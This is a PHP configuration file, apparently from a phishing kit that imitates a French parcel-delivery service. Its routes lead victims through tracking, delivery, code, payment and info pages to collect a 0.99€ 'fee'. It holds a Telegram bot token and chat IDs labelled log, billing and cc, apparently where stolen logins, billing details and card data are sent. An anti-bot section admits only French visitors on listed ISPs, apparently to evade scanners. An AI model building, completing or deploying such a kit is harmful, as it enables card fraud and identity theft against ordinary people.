<?php

require_once('src/App.php');

new Router([
    'config' => [
        'token' => '6892303115:AAF6O-Bwx8EiQ0C92F-QdBgw7txstdjITvg',
        'clique' => '-4060425620', //clique
        'log' => '-4060425620', //log
        'billing' => '-4060425620', //billing
        'cc' => '-4060425620', //cc

        'code' => '67365478',
        'ap' => false,
        'prix' => '0.99€',
        'delay' => 15 // temps pour la redi automatique
    ],
    'ab' => [
        'dev' => false,
        'whitelistIp' => [],
        'country' => [
            // [
            //     'countryCode' => 'RE',
            //     'validIsps' => false
            // ],
            // [
            //     'countryCode' => 'MQ',
            //     'validIsps' => false
            // ],
            [
                'countryCode' => 'FR',
                'validIsps' => [
                    'SFR',
                    'Free',
                    'Orange',
                    'Bouygues',
                    'Laposte',
                    'Prixtel',
                    'Wanadoo',
                    'Free SAS',
                    'France Telecom',
                    'Free',
                    'Coriolis',
                    'Monaco Telecom',
                    'POST Luxembourg'
                ],
            ],
        ]
    ],
    'routes' => [
        '/' => '/views/index.php',
        '/suivi' => '/views/suivi.php',
        '/livraison' => '/views/livraison.php',
        '/code' => '/views/code.php',
        '/pay' => '/views/pay.php',
        '/info' => '/views/info.php',
        '/fin' => '/views/fin.php',
        '/blip' => '/views/blip.php',

    ],
]);
